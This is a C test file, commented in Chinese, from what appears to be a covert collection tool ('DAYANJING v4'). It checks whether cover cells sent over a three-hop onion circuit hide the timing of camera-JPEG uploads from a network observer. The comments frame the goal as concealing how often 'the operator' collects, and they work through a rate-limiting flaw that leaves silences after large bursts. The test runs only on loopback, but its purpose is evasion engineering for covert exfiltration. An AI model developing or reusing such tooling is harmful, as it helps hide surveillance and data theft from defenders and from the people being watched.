/*
 * DAYANJING v4 — test_exfil_burst_cover.c
 *
 * 产物回传通道（上行）的覆盖取证：真实洋葱电路 + tee 旁路抓包 + A/B 对照。
 *
 * ====================================================================
 * 本轮要证的东西：大产物突发下，覆盖还填不填得住批间静默
 * ====================================================================
 * 上一轮 test_exfil_cover_circuit 用小产物（每批 1 个信元）证明了批间
 * 静默被填充：无覆盖 1218ms vs 有覆盖 63ms，19 倍差异。
 *
 * 但小产物是最轻的负载。真实采集产物（一帧截图/JPEG）是 **100KB 级**，
 * 编码后 **204 个信元/批**。这个场景此前从未测过，而它有充分理由失败：
 *
 *   p2p_cover_rate() 的公式是  cover = 预算/单信元成本 − 实测数据速率
 *
 *   一批 204 信元发出后，EWMA 窗口（5 秒）内的瞬时数据速率高达
 *       204 × 12 = 2448 信元/分钟
 *   EWMA 一轮后仍有 ~612 信元/分钟，远超预算换算出的 target（543/分钟）。
 *   于是 rate 被压成 0，再被 clamp 到 P2P_COVER_DEFAULT_MIN = **2/分钟**。
 *
 *   2 信元/分钟 == 30 秒一个。在 1200ms 的空档里 take_due 算出
 *       2 × 1200 × 1000 / 60000 = 40 毫信元 → 取整为 **0 个**
 *
 *   即：越是大产物突发，发完之后越是一句话不说。
 *
 * **这是一个时序错位的设计问题**：覆盖的需求恰恰在"刚发完数据之后"
 * 达到最大（那正是静默期），而抑制项用的是"刚刚过去的实测速率"——
 * 它在同一时刻达到峰值。需求与抑制在同一时间点撞在一起。
 *
 * 本测试就是把这个矛盾摆到台面上：用真实 3 跳洋葱电路 + tee 抓包，
 * 跑 A/B 对照，看大产物下 max_gap 到底是多少。
 *
 * 而产物回传恰恰是最暴露的方向：
 *   - 任务通道低频、小报文，静默期本来就长
 *   - 产物回传是**周期性突发**：采一帧 -> 发一批 -> 静默到下一帧
 *     观察者从「两次突发之间的间隔」直接反推采集频率，甚至能数出
 *     操作员一天采集了多少次、每次间隔多久
 *
 * 本测试把产物回传放到真实 3 跳洋葱电路上，在最后一跳与 sink 之间插一个
 * tee 旁路记录者，做 A/B 对照：
 *   A) budget=0（无覆盖）：一批发完即静默，批间是可测的长空档
 *   B) budget=N（有覆盖）：批间被覆盖信元填充
 *
 * ====================================================================
 * 指标为什么是「批间静默」而不是「尾部静默」
 * ====================================================================
 * 任务通道测的是尾部静默（命令发完后链路死寂多久）——任务通道是长连接，
 * 命令发完后链路还活着，那段死寂就是泄露。
 *
 * 产物通道不同：它是「发完一批、等下一次采集」的周期性突发。若照搬
 * 尾部静默指标，两端都是「发完即关」，测不出任何差异。真正泄露采集
 * 频率的是**两次突发之间那段时间**——那才是本测试要填的东西。
 *
 * 故核心指标取 max_gap_ms：相邻信元到达时刻的最大间隔。
 *   无覆盖 -> max_gap ≈ IDLE_MS（整段空档暴露）
 *   有覆盖 -> max_gap 被覆盖信元切成小段
 *
 * ====================================================================
 * 拓扑
 * ====================================================================
 *   endpoint ──洋葱3跳──> tee ──> sink
 *             EDGE0 -> EDGE1 -> CORE -> (tee) -> sink
 *
 * tee 是插在最后一跳与 sink 之间的旁路记录者，它看到的就是链路观察者
 * 能看到的全部：字节数、到达时刻。它不解密、不参与协议。
 */

#include "exfil.h"
#include "exfil_link.h"
#include "exfil_link_cover.h"
#include "p2p.h"
#include "crypto_x25519.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>
#include <poll.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <arpa/inet.h>

static int g_pass = 0, g_fail = 0;
#define CK(c, m) do { if (c) { g_pass++; printf("[PASS] %s\n", m); } \
                      else   { g_fail++; printf("[FAIL] %s\n", m); } } while (0)

/* 产物通道方向密钥：发送端 (K_A,K_B)，接收端互补 (K_B,K_A) */
static const uint8_t K_A[16] = { 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 };
static const uint8_t K_B[16] = { 16,15,14,13,12,11,10,9,8,7,6,5,4,3,2,1 };
static const uint8_t PFX[8]  = { 0xa1,0xa2,0xa3,0xa4,0xa5,0xa6,0xa7,0xa8 };

#define CELL_WIRE   512u
#define PERIOD_MS    50u
#define IDLE_MS    6000u    /* 两批产物之间的维持时长 */
#define N_BATCH       3u    /* 发送几批产物 */
#define PAYLOAD_SZ 100000u    /* 大产物：104 头 + 100000 -> 204 个信元/批 */
#define BUDGET_BPM 300000u  /* 有覆盖时的字节预算（约 5 KB/s） */

/* ---------------- 工具 ---------------- */

static uint32_t now_ms_real(void *ud)
{
    (void)ud;
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (uint32_t)(ts.tv_sec * 1000u + ts.tv_nsec / 1000000u);
}

static void sleep_ms(uint32_t ms)
{
    struct timespec ts;
    ts.tv_sec  = ms / 1000u;
    ts.tv_nsec = (long)(ms % 1000u) * 1000000L;
    nanosleep(&ts, NULL);
}

static void set_id(uint8_t *id, const char *s)
{
    memset(id, 0, P2P_NODE_ID_LEN);
    memcpy(id, s, strlen(s));
}

static int listen_auto(int *out_port)
{
    int s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0) return -1;
    int opt = 1;
    setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof opt);
    struct sockaddr_in a;
    memset(&a, 0, sizeof a);
    a.sin_family = AF_INET;
    a.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    a.sin_port = 0;
    if (bind(s, (struct sockaddr *)&a, sizeof a) < 0) { close(s); return -1; }
    if (listen(s, 8) < 0) { close(s); return -1; }
    socklen_t l = sizeof a;
    if (getsockname(s, (struct sockaddr *)&a, &l) < 0) { close(s); return -1; }
    *out_port = ntohs(a.sin_port);
    return s;
}

static int connect_to(uint16_t port)
{
    int s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0) return -1;
    struct sockaddr_in a;
    memset(&a, 0, sizeof a);
    a.sin_family = AF_INET;
    a.sin_port = htons(port);
    a.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    if (connect(s, (struct sockaddr *)&a, sizeof a) < 0) { close(s); return -1; }
    return s;
}

/* 把 from 上当前可读的字节全部搬到 to，返回搬了多少 */
static int xfer_all(int from, int to)
{
    uint8_t buf[65536];
    int total = 0;
    for (;;) {
        ssize_t n = recv(from, buf, sizeof buf, MSG_DONTWAIT);
        if (n <= 0) break;
        ssize_t w = send(to, buf, (size_t)n, 0);
        if (w <= 0) break;
        total += (int)n;
        if (n < (ssize_t)sizeof buf) break;
    }
    return total;
}

/* ---------------- 产物载荷：可校验的固定模式 ---------------- */

static void fill_payload(uint8_t *p, size_t n, uint64_t seq)
{
    for (size_t i = 0; i < n; i++)
        p[i] = (uint8_t)(0x40u + ((seq * 7u + i * 13u) & 0x3Fu));
}

static int check_payload(const uint8_t *p, size_t n, uint64_t seq)
{
    for (size_t i = 0; i < n; i++)
        if (p[i] != (uint8_t)(0x40u + ((seq * 7u + i * 13u) & 0x3Fu)))
            return 0;
    return 1;
}

static void fill_rec(exfil_rec_t *r, uint64_t seq, const uint8_t *p)
{
    memset(r, 0, sizeof *r);
    r->type    = EXF_TYPE_CAMERA_JPEG;
    r->seq     = seq;
    r->ts_us   = 1700000000000000ULL + seq;
    r->width   = 64;
    r->height  = 64;
    r->flags   = EXF_FLAG_KEYFRAME;
    snprintf(r->name, sizeof r->name, "cam%llu", (unsigned long long)seq);
    r->payload = p;
    r->plen    = PAYLOAD_SZ;
}

/* ---------------- tee：旁路抓包 ---------------- */

typedef struct {
    uint32_t t_ms;
    uint32_t len;
} tee_rec_t;

static pid_t spawn_tee(uint16_t target_port, int *out_port, const char *path)
{
    int pfd[2];
    if (pipe(pfd) < 0) return -1;
    pid_t pid = fork();
    if (pid < 0) { close(pfd[0]); close(pfd[1]); return -1; }
    if (pid == 0) {
        close(pfd[0]);
        int lp = 0, s = listen_auto(&lp);
        if (s < 0) _exit(2);
        if (write(pfd[1], &lp, sizeof lp) != (ssize_t)sizeof lp) _exit(3);
        close(pfd[1]);

        int cfd = accept(s, NULL, NULL);
        if (cfd < 0) _exit(4);
        int tfd = connect_to(target_port);
        if (tfd < 0) { fprintf(stderr, "[TEE] connect sink failed\n"); _exit(5); }
        fprintf(stderr, "[TEE] connected to sink port=%u\n", target_port);

        FILE *f = fopen(path, "wb");
        if (!f) _exit(6);

        uint32_t t0 = now_ms_real(NULL);
        struct pollfd pf[2];
        pf[0].fd = cfd; pf[0].events = POLLIN;
        pf[1].fd = tfd; pf[1].events = POLLIN;

        for (;;) {
            pf[0].revents = pf[1].revents = 0;
            int r = poll(pf, 2, 200);
            if (r < 0) break;
            if (r == 0) continue;
            if (pf[0].revents & (POLLIN | POLLHUP | POLLERR)) {
                int n = xfer_all(cfd, tfd);
                if (n <= 0) break;
                tee_rec_t rec;
                rec.t_ms = now_ms_real(NULL) - t0;
                rec.len  = (uint32_t)n;
                fwrite(&rec, sizeof rec, 1, f);
            }
            if (pf[1].revents & (POLLIN | POLLHUP | POLLERR)) {
                if (xfer_all(tfd, cfd) <= 0) break;
            }
        }
        fflush(f);
        fclose(f);
        close(cfd); close(tfd); close(s);
        _exit(0);
    }
    close(pfd[1]);
    int lp = 0;
    if (read(pfd[0], &lp, sizeof lp) != (ssize_t)sizeof lp) {
        close(pfd[0]); return -1;
    }
    close(pfd[0]);
    *out_port = lp;
    return pid;
}

/* ---------------- sink：产物接收端 ---------------- */

typedef struct {
    uint32_t total_cells;   /* 收到的信元总数 */
    uint32_t pad_cells;     /* 其中覆盖信元（PAD）数 */
    uint32_t prod;          /* 完整产出的产物条数 */
    uint32_t ok_content;    /* 其中载荷校验通过的条数 */
    int      err;           /* 首个错误码（0 无错） */
} sink_res_t;

static pid_t spawn_sink(int *port, int rpfd)
{
    int pfd[2];
    if (pipe(pfd) < 0) return -1;
    pid_t pid = fork();
    if (pid < 0) { close(pfd[0]); close(pfd[1]); return -1; }
    if (pid == 0) {
        close(pfd[0]);
        int lp = 0, s = listen_auto(&lp);
        if (s < 0) { fprintf(stderr, "[SINK] listen failed\n"); _exit(2); }
        fprintf(stderr, "[SINK] listening port=%d\n", lp);
        if (write(pfd[1], &lp, sizeof lp) != (ssize_t)sizeof lp) _exit(3);
        /*
         * 此处**不可** close(pfd[1])：本 sink 要在收完所有信元后把统计
         * 写回父进程（PAD 计数正是核心指标之一）。提前关写端会让父进程
         * read 立即拿到 EOF，结果是 sink.prod 全 0 —— 表面看是"产物没
         * 送达"，实际只是回传通道被自己关了。
         */

        int cfd = accept(s, NULL, NULL);
        if (cfd < 0) { fprintf(stderr, "[SINK] accept failed errno=%d\n", errno); _exit(4); }
        fprintf(stderr, "[SINK] accepted fd=%d\n", cfd);

        /* 接收端：与发送端互补 */
        exfil_chan_t ch;
        if (exfil_chan_init(&ch, K_B, K_A, PFX, 0) != EXF_OK) _exit(5);

        sink_res_t res;
        memset(&res, 0, sizeof res);

        uint8_t *pbuf = malloc(1u << 20);
        if (!pbuf) _exit(6);

        for (;;) {
            uint8_t buf[CELL_WIRE];
            size_t n = exfil_link_read_exact(cfd, buf, CELL_WIRE);
            if (n != CELL_WIRE) {
                fprintf(stderr, "[SINK] 首次/后续 read 短读: n=%zu want=%u "
                                "total=%u (errno=%d)\n",
                        n, CELL_WIRE, res.total_cells, errno);
                break;      /* EOF：对端关闭 */
            }
            res.total_cells++;

            exfil_rec_t r;
            memset(&r, 0, sizeof r);
            size_t plen = 0;
            int fr = exfil_chan_feed(&ch, buf, &r, pbuf, (1u << 20), &plen);
            if (fr == EXF_OK) {             /* PAD：覆盖信元，忽略 */
                res.pad_cells++;
                continue;
            }
            if (fr == EXF_PARTIAL) continue;
            if (fr == EXF_DONE) {
                res.prod++;
                if (plen == PAYLOAD_SZ && check_payload(pbuf, plen, r.seq))
                    res.ok_content++;
                continue;
            }
            fprintf(stderr, "[SINK] feed rc=%d at cell=%u "
                            "(PAD=%u prod=%u)\n",
                    fr, res.total_cells, res.pad_cells, res.prod);
            res.err = fr;
            break;
        }

        if (write(pfd[1], &res, sizeof res) != (ssize_t)sizeof res) { /* 忽略 */ }
        free(pbuf);
        exfil_chan_wipe(&ch);
        close(cfd); close(s); close(pfd[1]);
        _exit(0);
    }
    close(pfd[1]);
    int lp = 0;
    if (read(pfd[0], &lp, sizeof lp) != (ssize_t)sizeof lp) {
        close(pfd[0]); return -1;
    }
    dup2(pfd[0], rpfd);
    close(pfd[0]);
    *port = lp;
    return pid;
}

/* ---------------- 洋葱节点 ---------------- */

static pid_t spawn_onion_node(const p2p_mesh_t *m, const uint8_t *my_id,
                              const uint8_t sk[P2P_ONION_SK_LEN], int *port)
{
    int pfd[2];
    if (pipe(pfd) < 0) return -1;
    pid_t pid = fork();
    if (pid < 0) { close(pfd[0]); close(pfd[1]); return -1; }
    if (pid == 0) {
        close(pfd[0]);
        int lp = 0, s = listen_auto(&lp);
        if (s < 0) _exit(2);
        if (write(pfd[1], &lp, sizeof lp) != (ssize_t)sizeof lp) _exit(3);
        close(pfd[1]);
        p2p_onion_route_serve(m, my_id, sk, s);
        _exit(0);
    }
    close(pfd[1]);
    int lp = 0;
    if (read(pfd[0], &lp, sizeof lp) != (ssize_t)sizeof lp) {
        close(pfd[0]); return -1;
    }
    close(pfd[0]);
    *port = lp;
    return pid;
}

/* ---------------- 场景结果 ---------------- */

typedef struct {
    sink_res_t sink;
    uint32_t   n_cells;      /* tee 记录的搬运次数（近似信元粒度） */
    uint32_t   n_recs;       /* tee 记录条数 */
    uint32_t   max_gap_ms;   /* 相邻到达的最大间隔 —— 核心指标 */
    uint32_t   first_ms;
    uint32_t   last_ms;
    uint64_t   bytes;
    int        setup_err;
} scenario_t;

/* 解析 tee 记录：算 max_gap */
static void analyze_tee(const char *path, scenario_t *out)
{
    FILE *f = fopen(path, "rb");
    if (!f) { out->setup_err = -1; return; }
    tee_rec_t r;
    uint32_t prev = 0;
    int first = 1;
    out->max_gap_ms = 0;
    while (fread(&r, sizeof r, 1, f) == 1) {
        if (r.len == 0) continue;           /* len=0 不是信元 */
        out->n_recs++;
        out->bytes += r.len;
        if (first) { out->first_ms = r.t_ms; first = 0; }
        else {
            uint32_t gap = r.t_ms - prev;
            if (gap > out->max_gap_ms) out->max_gap_ms = gap;
        }
        prev = r.t_ms;
        out->last_ms = r.t_ms;
    }
    fclose(f);
    /* 信元数按 512 折算（tee 一次可能搬多个） */
    out->n_cells = (uint32_t)(out->bytes / CELL_WIRE);
}

/* ---------------- 一次完整场景 ---------------- */

static void run_scenario(uint32_t budget_bpm, const char *tee_path,
                         scenario_t *out)
{
    memset(out, 0, sizeof *out);

    uint8_t ID_EP[P2P_NODE_ID_LEN], ID_E0[P2P_NODE_ID_LEN],
            ID_E1[P2P_NODE_ID_LEN], ID_CORE[P2P_NODE_ID_LEN];
    set_id(ID_EP, "EPRT"); set_id(ID_E0, "EDE0");
    set_id(ID_E1, "EDE1"); set_id(ID_CORE, "ECOR");

    uint8_t sk_e0[32], pk_e0[32], sk_e1[32], pk_e1[32], sk_core[32], pk_core[32];
    x25519_generate_keypair(sk_e0, pk_e0);
    x25519_generate_keypair(sk_e1, pk_e1);
    x25519_generate_keypair(sk_core, pk_core);

    int p_core = 0, p_e1 = 0, p_e0 = 0, p_tee = 0, p_sink = 0;
    pid_t pid_core = -1, pid_e1 = -1, pid_e0 = -1, pid_tee = -1, pid_sink = -1;

    /* 1) core（洋葱最后一跳） */
    p2p_mesh_t m_core; p2p_mesh_init(&m_core);
    p2p_node_add(&m_core, ID_CORE, P2P_ROLE_CORE, "core", "127.0.0.1", 0);
    pid_core = spawn_onion_node(&m_core, ID_CORE, sk_core, &p_core);
    if (pid_core <= 0) { out->setup_err = -2; return; }

    /* 2) sink（产物接收端） */
    int rp = dup(0);
    pid_sink = spawn_sink(&p_sink, rp);
    if (pid_sink <= 0) { out->setup_err = -3; goto cleanup; }

    /* 3) tee：插在 core 与 sink 之间 */
    pid_tee = spawn_tee((uint16_t)p_sink, &p_tee, tee_path);
    if (pid_tee <= 0) { out->setup_err = -4; goto cleanup; }

    /* 4) edge1 -> core */
    p2p_mesh_t m_e1; p2p_mesh_init(&m_e1);
    p2p_node_add(&m_e1, ID_E1, P2P_ROLE_EDGE, "edge1", "127.0.0.1", 0);
    p2p_node_add(&m_e1, ID_CORE, P2P_ROLE_CORE, "core", "127.0.0.1", (uint16_t)p_core);
    p2p_neighbor_link(&m_e1, ID_E1, ID_CORE);
    pid_e1 = spawn_onion_node(&m_e1, ID_E1, sk_e1, &p_e1);
    if (pid_e1 <= 0) { out->setup_err = -5; goto cleanup; }

    /* 5) edge0 -> edge1 */
    p2p_mesh_t m_e0; p2p_mesh_init(&m_e0);
    p2p_node_add(&m_e0, ID_E0, P2P_ROLE_EDGE, "edge0", "127.0.0.1", 0);
    p2p_node_add(&m_e0, ID_E1, P2P_ROLE_EDGE, "edge1", "127.0.0.1", (uint16_t)p_e1);
    p2p_neighbor_link(&m_e0, ID_E0, ID_E1);
    pid_e0 = spawn_onion_node(&m_e0, ID_E0, sk_e0, &p_e0);
    if (pid_e0 <= 0) { out->setup_err = -6; goto cleanup; }

    /* 6) endpoint mesh：EP -> EDGE0 -> EDGE1 -> CORE */
    p2p_mesh_t m_ep; p2p_mesh_init(&m_ep);
    p2p_node_add(&m_ep, ID_EP, P2P_ROLE_ENDPOINT, "ep", "127.0.0.1", 0);
    p2p_node_add(&m_ep, ID_E0, P2P_ROLE_EDGE, "edge0", "127.0.0.1", (uint16_t)p_e0);
    p2p_node_add(&m_ep, ID_E1, P2P_ROLE_EDGE, "edge1", "127.0.0.1", (uint16_t)p_e1);
    p2p_node_add(&m_ep, ID_CORE, P2P_ROLE_CORE, "core", "127.0.0.1", (uint16_t)p_core);
    p2p_node_set_pub(&m_ep, ID_E0, pk_e0);
    p2p_node_set_pub(&m_ep, ID_E1, pk_e1);
    p2p_node_set_pub(&m_ep, ID_CORE, pk_core);
    p2p_neighbor_link(&m_ep, ID_EP, ID_E0);
    p2p_neighbor_link(&m_ep, ID_E0, ID_E1);
    p2p_neighbor_link(&m_ep, ID_E1, ID_CORE);

    /* 发送端通道：ks=K_A, kr=K_B */
    exfil_chan_t ch;
    if (exfil_chan_init(&ch, K_A, K_B, PFX, 0) != EXF_OK) {
        out->setup_err = -7; goto cleanup;
    }

    exfil_link_cover_t lc;
    if (exfil_link_cover_init(&lc, 0x9e3779b9u, PERIOD_MS, 0,
                              P2P_COVER_PROFILE_DIRECT, budget_bpm,
                              now_ms_real(NULL)) != EXF_LC_OK) {
        out->setup_err = -8; goto cleanup;
    }

    uint8_t salt[P2P_ONION_SALT_LEN];
    for (int i = 0; i < P2P_ONION_SALT_LEN; i++) salt[i] = (uint8_t)(i + 0x30);

    int fd = -1;
    int rc = p2p_onion_route_open(&m_ep, ID_EP, ID_CORE,
                                  "127.0.0.1", (uint16_t)p_tee, salt, &fd);
    if (rc != P2P_OK || fd < 0) { out->setup_err = -9; goto cleanup_lc; }

    /* 发 N_BATCH 批，批间用 idle 维持（无覆盖时 idle 产出 0） */
    uint8_t *pl = malloc(PAYLOAD_SZ);
    if (!pl) { out->setup_err = -10; goto cleanup_fd; }
    fill_payload(pl, PAYLOAD_SZ, 0);

    for (uint32_t b = 0; b < N_BATCH; b++) {
        fill_payload(pl, PAYLOAD_SZ, b + 1);
        exfil_rec_t r;
        fill_rec(&r, b + 1, pl);

        size_t nr = 0, nc = 0;
        int sr = exfil_link_send_adaptive(&ch, &lc, &r, fd,
                                          now_ms_real(NULL), 1u, &nr, &nc);
        if (sr != EXF_LC_OK) {
            printf("[DBG] batch %u FAILED: rc=%d (%s) real=%zu cover=%zu "
                   "pending=%zu enc=%zu/%zu q=%d\n",
                   b + 1, sr, exfil_link_cover_errstr(sr), nr, nc,
                   exfil_link_cover_pending(&lc), lc.enc_i, lc.enc_n,
                   lc.mx.n);
            out->setup_err = -11; free(pl); goto cleanup_fd;
        }

        /* 诊断：突发之后覆盖速率被压到多少 —— 本轮要证的核心数字 */
        printf("[DBG] batch %u: 数据信元=%zu 覆盖信元=%zu "
               "突发后 cover_rate=%u/min\n",
               b + 1, nr, nc, exfil_link_cover_rate(&lc));

        /* 批间维持：有覆盖时持续吐 PAD，无覆盖时产出 0（静默） */
        if (b + 1 < N_BATCH) {
            uint32_t t0 = now_ms_real(NULL);
            while ((uint32_t)(now_ms_real(NULL) - t0) < IDLE_MS) {
                size_t c2 = 0;
                (void)exfil_link_cover_idle(&ch, &lc, fd, now_ms_real(NULL), &c2);
                sleep_ms(20);
            }
        }
    }
    free(pl);

    /* 发完关闭，让 tee 与 sink 收尾 */
    close(fd);

    /* 收集 sink 结果 */
    {
        sink_res_t sr;
        memset(&sr, 0, sizeof sr);
        if (read(rp, &sr, sizeof sr) == (ssize_t)sizeof sr) out->sink = sr;
        else out->setup_err = -12;
        close(rp);
    }

    waitpid(pid_sink, NULL, 0);
    waitpid(pid_tee,  NULL, 0);

cleanup_fd:
    if (fd >= 0) close(fd);
cleanup_lc:
    exfil_link_cover_wipe(&lc);
    exfil_chan_wipe(&ch);
cleanup:
    if (pid_e0   > 0) { kill(pid_e0,   SIGKILL); waitpid(pid_e0,   NULL, 0); }
    if (pid_e1   > 0) { kill(pid_e1,   SIGKILL); waitpid(pid_e1,   NULL, 0); }
    if (pid_core > 0) { kill(pid_core, SIGKILL); waitpid(pid_core, NULL, 0); }
    if (pid_tee  > 0) { kill(pid_tee,  SIGKILL); waitpid(pid_tee,  NULL, 0); }
    if (pid_sink > 0) { kill(pid_sink, SIGKILL); waitpid(pid_sink, NULL, 0); }

    analyze_tee(tee_path, out);
}

int main(void)
{
    signal(SIGPIPE, SIG_IGN);

    scenario_t A, B;
    printf("=== 产物回传通道覆盖取证：真实洋葱电路 + tee 抓包 ===\n\n");

    printf("--- 场景A：budget=0（无覆盖，退化为纯突发） ---\n");
    run_scenario(0u, "/tmp/tee_burst_A.bin", &A);
    printf("[INFO] A: setup=%d sink.prod=%u pad=%u cells=%u max_gap=%ums\n",
           A.setup_err, A.sink.prod, A.sink.pad_cells, A.n_cells, A.max_gap_ms);

    printf("\n--- 场景B：budget=%u（有覆盖） ---\n", BUDGET_BPM);
    run_scenario(BUDGET_BPM, "/tmp/tee_burst_B.bin", &B);
    printf("[INFO] B: setup=%d sink.prod=%u pad=%u cells=%u max_gap=%ums\n",
           B.setup_err, B.sink.prod, B.sink.pad_cells, B.n_cells, B.max_gap_ms);
    printf("[INFO] B: sink.err=%d total=%u\n", B.sink.err, B.sink.total_cells);
    printf("[INFO] A: sink.err=%d total=%u\n", A.sink.err, A.sink.total_cells);

    printf("\n--- 断言 ---\n");

    CK(A.setup_err == 0 && B.setup_err == 0, "两个场景均正常建立");

    /* 功能正确性：产物必须完整、无损送达 */
    CK(A.sink.prod == N_BATCH && A.sink.ok_content == N_BATCH,
       "无覆盖：产物全部送达且载荷校验通过");
    CK(B.sink.prod == N_BATCH && B.sink.ok_content == N_BATCH,
       "有覆盖：产物全部送达且载荷校验通过");

    /* 覆盖信元必须被接收端正确忽略，绝不污染产物 */
    CK(A.sink.pad_cells == 0, "无覆盖：接收端未收到任何 PAD");
    CK(B.sink.pad_cells > 0,  "有覆盖：接收端收到 PAD 并已忽略");

    /* 核心：批间静默被填充 */
    CK(A.max_gap_ms >= IDLE_MS / 2,
       "无覆盖：批间存在长空档（采集周期可被推断）");
    CK(B.max_gap_ms < A.max_gap_ms / 2,
       "有覆盖：批间空档被切成小段（长度至少减半）");

    /* 线上总字节增加，且信元恒长 */
    CK(B.n_cells > A.n_cells, "有覆盖：线上信元数多于无覆盖");
    CK(A.bytes % CELL_WIRE == 0 && B.bytes % CELL_WIRE == 0,
       "线上字节均为 512 的整数倍（恒长信元）");

    printf("\n[INFO] A: bytes=%llu cells=%u\n",
           (unsigned long long)A.bytes, A.n_cells);
    printf("[INFO] B: bytes=%llu cells=%u\n",
           (unsigned long long)B.bytes, B.n_cells);
    printf("\n=== result: %d pass, %d fail ===\n", g_pass, g_fail);
    return g_fail ? 1 : 0;
}
